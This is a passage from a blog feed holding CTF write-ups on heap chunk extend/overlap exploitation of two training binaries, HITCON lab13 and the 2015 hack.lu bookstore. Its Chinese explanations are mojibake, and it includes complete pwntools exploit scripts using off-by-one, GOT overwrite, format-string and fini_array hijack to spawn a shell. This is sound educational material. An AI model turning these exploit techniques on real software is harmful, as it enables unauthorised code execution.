class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/2023/03/10/Chunk-Extend-and-Overlapping/"/>
      <url>/2023/03/10/Chunk-Extend-and-Overlapping/</url>
      
        <content type="html"><![CDATA[<h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec heapcreator</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/heapcreator&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>heaparrayæ˜¯ä¸€ä¸ªåœ¨bssæ®µçš„å…¨å±€heapç»“æ„ä½“æ•°ç»„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> size ;</span><br><span class="line">    <span class="type">char</span> *content ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freeåæ²¡æœ‰å°†contentæŒ‡é’ˆç½®é›¶</p><p>åœ¨editæ—¶è¿˜å­˜åœ¨off by oneæ¼æ´</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç©ºé—´å¤ç”¨çš„æœºåˆ¶æ”¹æ‰ä¸‹ä¸€ä¸ªchunkçš„size</p><p>create(0x18, bâ€oneâ€)<br>create(0x10, bâ€twoâ€) </p><p>ä¼šåˆ›å»ºå‡º4ä¸ª0x20çš„chunkï¼Œå…¶ä¸­oneçš„chunkä¼šåˆ©ç”¨twoçš„pre_sizeæ¥å­˜æ”¾æ•°æ®</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010202508.png" alt="image-20230311010202508"></p><p>è¿™æ ·æˆ‘ä»¬ç¼–è¾‘oneçš„contextå°±å¯ä»¥æ§åˆ¶twoçš„size</p><p>edit(0, â€œ&#x2F;bin&#x2F;sh\x00â€ + â€œaâ€ * 0x10 + â€œ\x41â€)</p><p>æ”¹ä¸º41</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010444200.png" alt="image-20230311010444200"></p><p>å†é‡Šæ”¾two  delete(1) å¯ä»¥çœ‹åˆ°å·²ç»æœ‰äº†overlapçš„chunk</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311011034574.png" alt="image-20230311011034574"></p><p>å†ç”³è¯·ä¸€ä¸ªå †å—create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got[â€˜freeâ€™]))</p><p>è¿™æ ·æˆ‘ä»¬çš„ *heapä¼šç”³è¯·åˆ°0x20çš„chunkï¼Œcontentä¼šç”³è¯·åˆ°0x40çš„chunkï¼Œæˆ‘ä»¬çš„0x40chunkä¼šoverlapåˆ°0x20çš„chunkï¼Œä»è€Œæ§åˆ¶å…¶å†…å®¹ï¼Œæˆ‘ä»¬æŠŠä»–çš„contentæŒ‡é’ˆæ”¹ä¸ºgotå°±ï¼Œå¯ä»¥åœ¨showçš„æ—¶å€™è¾“å‡ºåœ°å€</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311012105213.png" alt="image-20230311012105213"></p><p>è¿™æ ·å°±å¯ä»¥å¾—åˆ°systemåœ°å€ï¼Œè¿™æ—¶å€™å»edit two,å°±ä¼šä¿®æ”¹free goté‡Œé¢å†…å®¹ï¼Œæ”¹ä¸ºsystemï¼Œå†å»delete oneï¼ŒåŠ ä¸Šæˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„binshå°±å¯ä»¥æ‹¿åˆ°shell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311014939768.png" alt="image-20230311014939768"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./heapcreator&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x00400A43&#x27;</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">b&quot;one&quot;</span>) </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&quot;two&quot;</span>) </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">b&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">free_ad =u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;free_addr&#x27;</span>,free_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_ad)</span><br><span class="line">base=free_ad-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec books_e_o </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/books_e_o&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="å¤§ä½“æ€è·¯"><a href="#å¤§ä½“æ€è·¯" class="headerlink" title="å¤§ä½“æ€è·¯"></a>å¤§ä½“æ€è·¯</h3><p>ç¨å¾®çœ‹ä¸€ä¸‹æ¼æ´æŒºå¤šçš„</p><ul><li>mainå‡½æ•°é‡Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>delete_orderå‡½æ•°é‡Œæœ‰uafæ¼æ´</li><li>edit_orderå‡½æ•°é‡Œæœ‰ä»»æ„å †è¦†ç›–æ¼æ´ï¼Œå¯ä»¥è¿›è¡Œoverlap</li></ul><p>å †æˆ‘ä»¬ä¸èƒ½è‡ªå·±ç”³è¯·ï¼Œåªèƒ½mainå‰é¢ç”³è¯·äº†0x80å¤§å°çš„ä¸‰ä¸ªå †ï¼Œåé¢submitæ—¶ä¸€ä¸ª0x140å †</p><p>print(dest)</p><p>destæ˜¯ç¬¬ä¸‰ä¸ªå †ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…ˆåˆ©ç”¨è¦†ç›–æ¼æ´å°†ç¬¬äºŒä¸ªå †çš„sizeè¦†ç›–ä¸º0x150è¿™æ ·å†deleteè¿™ä¸ªå †å°±ä¼šæŠŠdestä¸€å—é‡Šæ”¾åˆ°binsï¼Œåé¢å†submitç”³è¯·æ—¶ï¼Œå°±ä¼šç”³è¯·åˆ°è¿™ä¸ªå †ï¼Œsubmitè¿™ä¸ªå †æ˜¯å¯ä»¥åˆ©ç”¨å †1å’Œå †2ä¸­çš„å€¼æ§åˆ¶çš„ï¼Œä»è€Œè®¡ç®—å¥½åç§»ï¼Œæ§åˆ¶destï¼Œè¿›ä¸€æ­¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">submit</span><span class="params">(<span class="type">char</span> *all, <span class="type">const</span> <span class="type">char</span> *order1, <span class="type">char</span> *order2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(all, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(order1);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order1, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(all, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(order2);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order2, v4);</span><br><span class="line">  *(_WORD *)&amp;all[<span class="built_in">strlen</span>(all)] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ ¼å¼åŒ–æ¼æ´åŸºæœ¬ä¸Šéƒ½è¦å…ˆæ³„éœ²åœ°å€ï¼Œå†å¸ƒç½®æ”¹å†™åœ°å€ï¼Œæ­¤é¢˜ä¹Ÿä¸ä¾‹å¤–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line"><span class="built_in">printf</span>(dest);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¹‹åï¼Œå°±ä¼šretï¼Œæ— æ³•å†æ¬¡åˆ©ç”¨ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬åˆ©ç”¨ fini_array hookæ‰æ‰§è¡Œæµ</p><blockquote><p>fini_array hook</p><p><code>.init_array</code>å’Œ <code>.fini_array</code>ä¸­å­˜æ”¾äº†æŒ‡å‘åˆå§‹åŒ–ä»£ç å’Œç»ˆæ­¢ä»£ç çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p><code>.init_array</code>ä¼šåœ¨main()å‡½æ•°è°ƒç”¨å‰æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥é€šè¿‡ä¿®è¯¥åœ°å€çš„æŒ‡é’ˆæ¥å°†æ§åˆ¶æµæŒ‡å‘ç—…æ¯’æˆ–è€…å¯„ç”Ÿä»£ç ï¼Œå› ä¸ºæ¯”mainæ‰§è¡Œè¿˜æ—©ï¼Œå¤§éƒ¨åˆ†æ¶æ„è½¯ä»¶éƒ½æ˜¯hookè¿™ä¸ªï¼Œæ„Ÿè§‰c++çš„æ„é€ å‡½æ•°æˆ–è®¸å’Œè¿™ä¸ªç›¸å…³</p><p><code>.fini_array</code> å‡½æ•°æŒ‡é’ˆåœ¨ main() å‡½æ•°æ‰§è¡Œå®Œä¹‹åæ‰è¢«è§¦å‘ï¼Œæ„Ÿè§‰c++çš„ææ„å‡½æ•°æˆ–è®¸å’Œè¿™ä¸ªç›¸å…³</p><p>åœ¨<code>.init_array</code> array[0]-&gt;array[1]</p><p>åœ¨<code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172008247.png" alt="image-20230311172008247"></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥äºŒæ¬¡åˆ©ç”¨æ¼æ´è¿›è¡Œæ”¹å†™åœ°å€</p><h3 id="å…·ä½“ç»†èŠ‚"><a href="#å…·ä½“ç»†èŠ‚" class="headerlink" title="å…·ä½“ç»†èŠ‚"></a>å…·ä½“ç»†èŠ‚</h3><p>åˆšå¼€å§‹çš„å †</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172557368.png" alt="image-20230311172557368"></p><p>payload &#x3D; bâ€%â€+str(2617).encode()+bâ€c%13$hnâ€ + bâ€™abc%51$pâ€™ + bâ€™def%26$pâ€™<br>payload +&#x3D; bâ€™Aâ€™*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,bâ€™\x00â€™)<br>payload +&#x3D; p64(0x151)</p><p>edit(1,payload)</p><p>è¦†ç›–sizeçš„å †</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172648818.png" alt="image-20230311172648818"></p><p>è¿™é‡Œpayloadçš„%51æ˜¯è¿”å›åœ°å€__libc_start_main+128çš„</p><blockquote><p>ä¸ºä»€ä¹ˆæ˜¯0x74å‘¢</p><p>è¿™é‡Œsubmitå‡½æ•°å¯ä»¥çœ‹å‡ºä»–è¿˜è¿›è¡Œæ‹¼æ¥ï¼Œæ­£å¸¸çš„è¯éœ€è¦0x90ä¸ªå­—èŠ‚åˆ°è¾¾destå†…å®¹ï¼Œ</p><p>â€˜Order 1:<code>+</code>chunk1<code>+</code>\n<code>+</code>Order 2:<code>+</code>Order 1: â€™ æ‹¼æ¥å¯¼è‡´ä»–ä¼šå¤š28ä¸ªå­—èŠ‚</p><p>0x90-28&#x3D;0x74</p></blockquote><p>æˆ‘ä»¬å†</p><p>delete(2)</p><p>payload2 &#x3D; p8(0x0)*7 + p64(fini_array)<br>submit(payload2)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter first </span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨fgetï¼Œçš„sæ˜¯åœ¨æ ˆä¸Šçš„ï¼Œgdbå¾—åˆ°fini_arrayè¢«å†™åˆ°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬13ä¸ªå‚æ•°</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175311347.png" alt="image-20230311175311347"></p><p>0x400830å’Œmainåœ°å€ 0x400A39åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„å·®è·æˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªpayloadåˆ©ç”¨bâ€%â€+str(2617).encode()+bâ€c%13$hnâ€æ”¹å†™ä¸ºmainï¼Œè¿™æ ·main retæ˜¯ä¼šå†æ¬¡è¿”å›åˆ°main</p><p>ç¬¬ä¸€ä¸ªpayçš„%26$pæ˜¯</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175610680.png" alt="image-20230311175610680"></p><p>ä»–å’Œåé¢çš„è¿”å›åœ°å€å·²ç»ä¸‹æ¬¡hookè¿”å›åˆ°mainçš„åœ°å€çš„è¿”å›åœ°å€çš„æ ˆåœ°å€åç§»æ˜¯å›ºå®šçš„</p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311180117794.png" alt="image-20230311180117794" style="zoom:67%;"><p>è®¡ç®—å‡ºæ¥<code>ret_bp=fixed-0x461-0x100</code></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ”¹å†™è¿™ä¸ªmainçš„è¿”å›åœ°å€ä¸ºone_gadgetåœ°å€</p><p>payload&#x3D;bâ€™%â€™+str(one_gadget&amp;0xff).encode()+bâ€™c%13$hhn%â€™+str(((one_gadget&gt;&gt;8)&amp;0xffff)-(one_gadget&amp;0xff)).encode()+bâ€™c%14$hnâ€™<br>print(payload)<br>payload +&#x3D; bâ€™Aâ€™*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,bâ€™\x00â€™)<br>payload +&#x3D; p64(0x151)<br>edit(1,payload)<br>delete(2)<br>payload&#x3D;p8(0x0)*7+p64(ret_bp)+p64(ret_bp+1)<br>submit(payload)</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181810289.png" alt="image-20230311181810289"></p><p>æ‹¿åˆ°shell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181846332.png" alt="image-20230311181846332"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./books_e_o&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">order, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; order:\n&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">order</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order + <span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span> + payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 1: &#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 2: Order 1: &#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># db(&#x27;b *0x400A91&#x27;)</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">2617</span>).encode()+<span class="string">b&quot;c%13$hn&quot;</span>  + <span class="string">b&#x27;abc%51$p&#x27;</span> + <span class="string">b&#x27;def%26$p&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload2 = p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">submit(payload2)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line">ru(<span class="string">b&#x27;def&#x27;</span>)</span><br><span class="line">fixed=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">p(<span class="string">&#x27;fixed&#x27;</span>,fixed)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">ret_bp=fixed-<span class="number">0x461</span>-<span class="number">0x100</span></span><br><span class="line">p(<span class="string">&#x27;ret_bp&#x27;</span>,ret_bp)</span><br><span class="line">one_gadget=<span class="number">0xebcf5</span>+base</span><br><span class="line">p(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%13$hhn%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)-(one_gadget&amp;<span class="number">0xff</span>)).encode()+<span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=p8(<span class="number">0x0</span>)*<span class="number">7</span>+p64(ret_bp)+p64(ret_bp+<span class="number">1</span>)</span><br><span class="line">submit(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Chunk Extend And Overlapping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023é»„æ²³æµåŸŸå…¬å®‰é™¢æ ¡ç½‘ç»œç©ºé—´å®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ› PWN</title>
      <link href="/2023/03/05/sd-police2023-pwn/"/>
      <url>/2023/03/05/sd-police2023-pwn/</url>
      
